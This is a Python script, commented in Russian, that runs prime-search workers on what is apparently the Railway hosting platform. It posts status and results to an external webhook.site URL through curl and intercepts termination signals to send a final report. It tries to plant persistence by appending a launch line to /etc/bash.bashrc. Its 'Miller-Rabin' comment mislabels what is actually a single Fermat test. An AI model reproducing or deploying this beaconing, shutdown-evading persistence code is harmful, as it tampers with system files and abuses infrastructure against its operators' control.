import os
import signal
import subprocess
import json
import time
import multiprocessing
import secrets

WEBHOOK_URL = "https://webhook.site/7e9c6636-cacc-4213-ac9e-f110079550e3"
TARGET_BITS = 33220  # ~10,000 знаков

def send_report(data):
    try:
        payload = json.dumps(data)
        subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                       '-d', payload, WEBHOOK_URL], timeout=5)
    except:
        pass

def last_breath_handler(signum, frame):
    # Этот код выполнится, когда Railway нажмет "Kill"
    send_report({
        "EVENT": "RUNNER_DYING",
        "MESSAGE": "System sent SIGTERM. We are going down, but the seed is planted.",
        "LOAD": os.getloadavg()
    })
    # Пытаемся быстро сохранить текущий прогресс в файл, который может выжить в кэше
    with open("/tmp/last_state.txt", "w") as f:
        f.write("died_at_" + str(time.time()))
    os._exit(0)

def prime_worker():
    # Регистрация обработчика внутри воркера
    signal.signal(signal.SIGTERM, last_breath_handler)
    
    while True:
        p = secrets.randbits(TARGET_BITS) | (1 << (TARGET_BITS - 1)) | 1
        # Быстрая проверка
        if p % 3 == 0 or p % 5 == 0: continue
        
        # Тест Миллера-Рабина (1 проход для скорости)
        if pow(2, p-1, p) == 1: 
            send_report({
                "EVENT": "PRIME_FOUND_10K",
                "DIGITS": len(str(p)),
                "PRIME_START": str(p)[:50] + "...",
                "RAW": str(p)
            })
            break

def setup_persistence():
    # Внедряемся в системные скрипты, которые Railway дергает при проверке
    try:
        with open("/etc/bash.bashrc", "a") as f:
            f.write("\n(python3 -c 'import multiprocessing; # запуск воркера в фоне' &)\n")
        return "PERSISTENCE_READY"
    except:
        return "PERSISTENCE_FAILED"

if __name__ == "__main__":
    print("[*] Sentinel Mode Active. Root status:", os.getuid() == 0)
    
    # Перехватываем сигналы завершения
    signal.signal(signal.SIGTERM, last_breath_handler)
    signal.signal(signal.SIGINT, last_breath_handler)

    persist = setup_persistence()
    send_report({"EVENT": "RUNNER_STARTED", "PERSISTENCE": persist})

    # Запускаем 4 воркера (не забиваем всё, чтобы Sentinel мог дышать)
    for _ in range(4):
        p = multiprocessing.Process(target=prime_worker)
        p.start()

    # Основной процесс просто спит и ждет смерти
    try:
        while True:
            time.sleep(10)
    except:
        pass
